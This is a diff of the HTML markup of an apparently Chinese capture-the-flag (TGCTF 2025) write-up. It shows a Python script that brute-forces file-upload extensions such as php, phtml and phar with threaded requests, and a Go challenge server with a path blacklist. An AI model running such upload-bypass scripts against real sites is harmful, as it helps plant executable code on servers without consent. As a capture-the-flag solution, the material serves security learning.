-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">request_body</span> <span class="o">=</span> <span class="s1">&#39;\r\n&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">.</span><span class="nx">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">request_body</span> <span class="o">=</span> <span class="s1">&#39;\r\n&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">.</span><span class="nx">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nx">response</span> <span class="o">=</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">url</span><span class="p">,</span>
@@ -2203,11 +2203,11 @@
 </span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type&#34;</span><span class="o">:</span> <span class="nx">f</span><span class="s2">&#34;multipart/form-data; boundary={boundary}&#34;</span>
 </span></span><span class="line"><span class="cl">            <span class="p">},</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="o">=</span><span class="nx">request_body</span><span class="p">,</span>  <span class="c1"># 使用正确编码的数据
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">timeout</span><span class="o">=</span><span class="mi">5</span>
+</span></span></span><span class="line"><span class="cl">            <span class="nx">timeout</span><span class="o">=</span><span class="mi">5</span>
 </span></span><span class="line"><span class="cl">        <span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1"># 修复3: 增强成功检测逻辑
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">success</span> <span class="o">=</span> <span class="k">False</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">success</span> <span class="o">=</span> <span class="k">False</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">response</span><span class="o">.</span><span class="nx">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">success</span> <span class="o">=</span> <span class="nx">any</span><span class="p">(</span><span class="nx">keyword</span> <span class="nx">in</span> <span class="nx">response</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">lower</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="nx">keyword</span> <span class="nx">in</span> <span class="p">[</span><span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="s2">&#34;path&#34;</span><span class="p">])</span>
@@ -2223,33 +2223,33 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">brute_extensions</span><span class="p">()</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">    <span class="c1"># 优先测试高危扩展名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">high_risk_exts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;phtml&#39;</span><span class="p">,</span> <span class="s1">&#39;phar&#39;</span><span class="p">,</span> <span class="s1">&#39;inc&#39;</span><span class="p">,</span> <span class="s1">&#39;pgp&#39;</span><span class="p">]</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">high_risk_exts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;phtml&#39;</span><span class="p">,</span> <span class="s1">&#39;phar&#39;</span><span class="p">,</span> <span class="s1">&#39;inc&#39;</span><span class="p">,</span> <span class="s1">&#39;pgp&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1"># 生成所有三位组合
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">all_exts</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="k">for</span> <span class="nx">c</span> <span class="nx">in</span> <span class="nx">itertools</span><span class="o">.</span><span class="nx">product</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">,</span> <span class="nx">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">all_exts</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="k">for</span> <span class="nx">c</span> <span class="nx">in</span> <span class="nx">itertools</span><span class="o">.</span><span class="nx">product</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">,</span> <span class="nx">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="nx">with</span> <span class="nx">ThreadPoolExecutor</span><span class="p">(</span><span class="nx">max_workers</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span> <span class="k">as</span> <span class="nx">executor</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">        <span class="c1"># 提交任务
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">futures</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">futures</span> <span class="o">=</span> <span class="p">{}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1"># 优先测试高危扩展
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">high_risk_exts</span><span class="o">:</span>
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">high_risk_exts</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">future</span> <span class="o">=</span> <span class="nx">executor</span><span class="o">.</span><span class="nx">submit</span><span class="p">(</span><span class="nx">test_extension</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">futures</span><span class="p">[</span><span class="nx">future</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ext</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1"># 提交全量组合
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">all_exts</span><span class="o">:</span>
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">all_exts</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">ext</span> <span class="k">not</span> <span class="nx">in</span> <span class="nx">high_risk_exts</span><span class="o">:</span>  <span class="c1"># 避免重复
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">future</span> <span class="o">=</span> <span class="nx">executor</span><span class="o">.</span><span class="nx">submit</span><span class="p">(</span><span class="nx">test_extension</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
+</span></span></span><span class="line"><span class="cl">                <span class="nx">future</span> <span class="o">=</span> <span class="nx">executor</span><span class="o">.</span><span class="nx">submit</span><span class="p">(</span><span class="nx">test_extension</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">                <span class="nx">futures</span><span class="p">[</span><span class="nx">future</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ext</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1"># 实时处理结果
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">future</span> <span class="nx">in</span> <span class="nx">as_completed</span><span class="p">(</span><span class="nx">futures</span><span class="p">)</span><span class="o">:</span>
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">future</span> <span class="nx">in</span> <span class="nx">as_completed</span><span class="p">(</span><span class="nx">futures</span><span class="p">)</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">success</span><span class="p">,</span> <span class="nx">ext</span> <span class="o">=</span> <span class="nx">future</span><span class="o">.</span><span class="nx">result</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">success</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">                <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] 有效后缀发现: {ext}&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">                <span class="c1"># 暴力终止所有线程
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">for</span> <span class="nx">f</span> <span class="nx">in</span> <span class="nx">futures</span><span class="o">:</span>
+</span></span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="nx">f</span> <span class="nx">in</span> <span class="nx">futures</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">                    <span class="nx">f</span><span class="o">.</span><span class="nx">cancel</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">                <span class="nx">executor</span><span class="o">.</span><span class="nx">shutdown</span><span class="p">(</span><span class="nx">wait</span><span class="o">=</span><span class="k">False</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">ext</span>
@@ -2266,7 +2266,7 @@
 </div><p><img src="/p/2025-tgctf-write.up/image-20250417210632194.png"
 	width="1582"
 	height="817"
-	srcset="/p/2025-tgctf-write.up/image-20250417210632194_hu_15755b8c6fcac9d8.png 480w, /p/2025-tgctf-write.up/image-20250417210632194_hu_25f1d89a2a7e43e1.png 1024w"
+	srcset="/p/2025-tgctf-write.up/image-20250417210632194_hu_42c17765fd6bff6.png 480w, /p/2025-tgctf-write.up/image-20250417210632194_hu_1cbada4f11f80452.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250417210632194"
@@ -2478,7 +2478,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;fmt&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;io&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;log&#34;</span><span class="w">
@@ -2488,50 +2488,50 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;strings&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;text/template&#34;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;time&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Note 代表一个笔记文件的信息</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">type</span><span class="w"> </span><span class="nx">Note</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Note 代表一个笔记文件的信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">type</span><span class="w"> </span><span class="nx">Note</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Name</span><span class="w">       </span><span class="kt">string</span><span class="w"> </span><span class="c1">// 文件名</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">ModTime</span><span class="w">    </span><span class="kt">string</span><span class="w"> </span><span class="c1">// 修改时间</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Size</span><span class="w">       </span><span class="kt">int64</span><span class="w">  </span><span class="c1">// 文件大小</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">IsMarkdown</span><span class="w"> </span><span class="kt">bool</span><span class="w">   </span><span class="c1">// 是否是Markdown文件</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// PageData 用于模板渲染的数据结构</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">type</span><span class="w"> </span><span class="nx">PageData</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// PageData 用于模板渲染的数据结构</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">type</span><span class="w"> </span><span class="nx">PageData</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Notes</span><span class="w"> </span><span class="p">[]</span><span class="nx">Note</span><span class="w"> </span><span class="c1">// 笔记列表</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">Error</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="c1">// 错误信息</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// blackJack 检查路径是否包含危险字符</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">blackJack</span><span class="p">(</span><span class="nx">path</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// blackJack 检查路径是否包含危险字符</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">blackJack</span><span class="p">(</span><span class="nx">path</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;..&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;非法路径&#34;</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// renderTemplate 渲染HTML模板</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">renderTemplate</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">tmpl</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="kd">interface</span><span class="p">{})</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// renderTemplate 渲染HTML模板</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">renderTemplate</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">tmpl</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="kd">interface</span><span class="p">{})</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">templates</span><span class="p">.</span><span class="nf">ExecuteTemplate</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">tmpl</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// renderError 渲染错误页面</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// renderError 渲染错误页面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">templates</span><span class="p">.</span><span class="nf">ExecuteTemplate</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;error.html&#34;</span><span class="p">,</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;Code&#34;</span><span class="p">:</span><span class="w">    </span><span class="nx">code</span><span class="p">,</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;Message&#34;</span><span class="p">:</span><span class="w"> </span><span class="nx">message</span><span class="p">,</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">})</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">var</span><span class="w"> </span><span class="nx">templates</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">template</span><span class="p">.</span><span class="nf">Must</span><span class="p">(</span><span class="nx">template</span><span class="p">.</span><span class="nf">ParseGlob</span><span class="p">(</span><span class="s">&#34;templates/*&#34;</span><span class="p">))</span><span class="w"> </span><span class="c1">// 模板引擎</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">var</span><span class="w"> </span><span class="nx">templates</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">template</span><span class="p">.</span><span class="nf">Must</span><span class="p">(</span><span class="nx">template</span><span class="p">.</span><span class="nf">ParseGlob</span><span class="p">(</span><span class="s">&#34;templates/*&#34;</span><span class="p">))</span><span class="w"> </span><span class="c1">// 模板引擎</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">os</span><span class="p">.</span><span class="nf">Mkdir</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span><span class="w"> </span><span class="mo">0755</span><span class="p">)</span><span class="w"> </span><span class="c1">// 创建笔记存储目录</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">// 检查/flag路径（演示用，实际会返回错误）</span><span class="w">
@@ -2658,7 +2658,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">srv</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">())</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>漏洞点是</p>
@@ -3587,7 +3587,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
